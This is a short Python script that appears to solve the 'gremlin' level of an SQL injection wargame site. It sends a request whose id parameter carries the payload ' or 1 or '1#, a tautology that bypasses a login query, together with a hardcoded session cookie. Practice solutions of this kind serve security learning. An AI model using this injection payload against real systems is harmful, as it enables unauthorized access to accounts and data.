import requests

url = "https://los.rubiya.kr/gremlin_280c5552de8b681110e9287421b834fd.php"

params = {
    "id":"' or 1 or '1#"
}

headers = {
    "Cookie": "PHPSESSID=uqo3sq1m5m7oaq9l3fjf2fcqc6"
}

res = requests.get(url, headers=headers, params=params)

print res.content